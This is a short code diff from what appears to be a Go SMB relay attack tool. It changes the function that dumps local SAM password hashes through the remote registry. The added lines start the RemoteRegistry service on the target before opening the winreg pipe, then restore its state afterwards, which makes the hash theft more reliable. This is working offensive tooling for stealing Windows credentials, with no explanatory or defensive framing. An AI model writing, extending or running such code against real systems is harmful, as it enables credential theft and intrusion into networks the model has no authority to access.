@@ -41,10 +41,16 @@ func (a *SAMDumpAttack) Run(session interface{}, config *Config) error {
 func samDumpAttack(client *SMBRelayClient, cfg *Config) error {
 	log.Printf("[*] Dumping local SAM hashes via remote registry on %s", cfg.TargetAddr)
 
-	// Connect to IPC$ and open winreg pipe
+	// Connect to IPC$ and ensure RemoteRegistry is running before opening
+	// the winreg pipe. Without this the winreg CreatePipe intermittently
+	// fails with PIPE_NOT_AVAILABLE when the service is stopped or disabled
+	// (KNOWN_ISSUES.md #3). Matches the standalone secretsdump pattern.
 	if err := client.TreeConnect("IPC$"); err != nil {
 		return fmt.Errorf("tree connect IPC$: %v", err)
 	}
+
+	rrState := ensureRemoteRegistryStarted(client)
+	defer restoreRemoteRegistryState(client, rrState)
 
 	fileID, err := client.CreatePipe("winreg")
 	if err != nil {
